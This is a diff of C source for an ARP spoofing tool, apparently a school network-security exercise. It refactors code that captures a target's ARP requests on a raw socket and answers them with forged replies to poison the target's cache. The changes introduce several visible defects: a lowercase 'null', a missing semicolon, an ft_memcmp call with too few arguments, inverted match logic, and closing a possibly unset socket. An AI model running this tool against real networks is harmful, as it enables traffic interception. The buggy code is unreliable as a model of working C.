@@ -10,8 +10,8 @@
 #include "ft_status.h"
 #include "malcolm_validator.h"
 #include "ft_spoof.h"
+#include "parser.h"
 #include "libft.h"
-
 
 char   *chooseInterface(void)
 {
@@ -20,11 +20,9 @@ char   *chooseInterface(void)
 
     if (getifaddrs(&ifaddr) < 0)
     {
-        printf("ERROR: Can't get network interfaces");
-        perror("getifaddrs");
-        exit(CANT_GET_NETWORK_INTERFACES);
+        perror("Can't get network interfaces");
+        return null;
     }
-
 
     for(ifa = ifaddr; ifa; ifa = ifa->ifa_next)
     {
@@ -42,53 +40,36 @@ char   *chooseInterface(void)
     }
     freeifaddrs(ifaddr);
     return interface_name;
-
-}
-
-//TODO fix leaks or delete
-char   *ipv4_to_str(uint8_t *addr)
-{
-    int     i = 0;
-    char    *str = "";
-
-    for(; i < IP_LEN; ++i)
-    {
-        char *cur = ft_itoa(addr[i]);
-        str = ft_strjoin(str, cur);
-        if (i < IP_LEN-1) {
-            str = ft_strjoin(str, ".");
-        }
-    }
-    return str;
 }
 
 int     is_arp_request_from_target(uint8_t *ip_rqst, uint8_t *mac_rqst, uint8_t *ip_target, uint8_t *mac_target)
 {
-    for(int i = 0; i < IP_LEN; ++i)
+    if (ft_memcmp(ip_rqst, ip_target, IP_LEN) != 0 || ft_memcmp(mac_rqst, mac_target) != 0)
     {
-        if (ip_rqst[i] != ip_target[i])
-        {
-            return 0;
-        }
+        return 1;
     }
+    return 0;
+}
 
-    for(int i = 0; i < MAC_LEN; ++i)
+int     is_arp_request_for_source(uint8_t *ip_rqst, uint8_t *ip_src) {
+    if (ft_memcmp(ip_rqst, ip_src, IP_LEN) != 0)
     {
-        if(mac_rqst[i] != mac_target[i])
-        {
-            return 0;
-        }
+        return 0;
     }
-    return 1;
+    else
+    {
+        return 1;
+    }
 }
 
 int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct ft_arphdr *arp, struct sockaddr_ll to, int sock)
 {
-    struct ft_arpbody response;
-    uint8_t tmpip[IP_LEN];
-    int     sentlen;
-    socklen_t addrlen = sizeof(struct sockaddr_ll);
+    struct ft_arpbody   response;
+    uint8_t             tmpip[IP_LEN];
+    int                 sentlen;
+    socklen_t           addrlen;
 
+    addrlen = sizeof(struct sockaddr_ll)
     printf("Sending ARP response to target\n");
 
     ft_memcpy(eth->trgt_mac, eth->src_mac, MAC_LEN);
@@ -133,7 +114,8 @@ int     spoof(struct spoofaddrs addrs, int sock)
         reclen = recvfrom(sock, buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&from, &fromlen);
         if(reclen < 0)
         {
-            perror("ERROR: Can't receive message\n");
+            perror("ERROR: Can't receive message");
+            close(sock);
             exit(CANT_RECEIVE_MESSAGE);
         }
         
@@ -146,43 +128,23 @@ int     spoof(struct spoofaddrs addrs, int sock)
             continue;
         }
 
-        if (is_arp_request_from_target(arp->spa, arp->sha, addrs.ip_target, addrs.mac_target))
+        if (
+                is_arp_request_from_target(arp->spa, arp->sha, addrs.ip_target, addrs.mac_target)
+                &&
+                is_arp_request_for_source(arp->tpa, addrs.ip_source)
+        )
         {
-            printf("ARP request from target received!\n");
+            printf("ARP request from target to source received!\n");
             done = send_arp_response(addrs, eth, arp, from, sock) == SUCCESS;
         }
     }
     return SUCCESS;
 }
 
-void parse_ip_v4(char *str_ip, uint8_t *dst)
-{
-    in_addr_t ip = inet_addr(str_ip);
-    uint8_t *ptr = (uint8_t*)&ip;
-    for(int i = 0; i < IP_LEN; ++i)
-    {
-        dst[i] = ptr[i];
-    }
-}
-
-void parse_mac(char *mac, uint8_t *dst)
-{
-    char** part = ft_split(mac, ':');
-    int i = 0;
-
-    while (part && *part)
-    {
-
-        dst[i++] = ft_atoi_base(*part, "0123456789abcdef");
-        ++part;
-    }
-}
-
-
 int     main(int argc, char** argv)
 {
     int                 validation_result, sock;
-    // char                *interface_name;
+    char                *interface_name;
     struct spoofaddrs   spaddrs;
 
     validation_result = validate_args(argc, argv);
@@ -195,19 +157,19 @@ int     main(int argc, char** argv)
     parse_mac(argv[2], spaddrs.mac_source);
     parse_mac(argv[4], spaddrs.mac_target);
     
-    // interface_name = chooseInterface();
+    interface_name = chooseInterface();
 
-
-    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));    
-    // sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (sock < 0)
+    if (interface_name)
     {
-        printf("ERROR: Can't open socket\n");
-        perror("socket");
-        return CANT_OPEN_SOCKET;
+        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+        if (sock < 0)
+        {
+            perror("Can't open socket");
+            return CANT_OPEN_SOCKET;
+        }
+        spoof(spaddrs, sock);
     }
 
-    spoof(spaddrs, sock);
-
+    close(sock);
     return SUCCESS;
 }
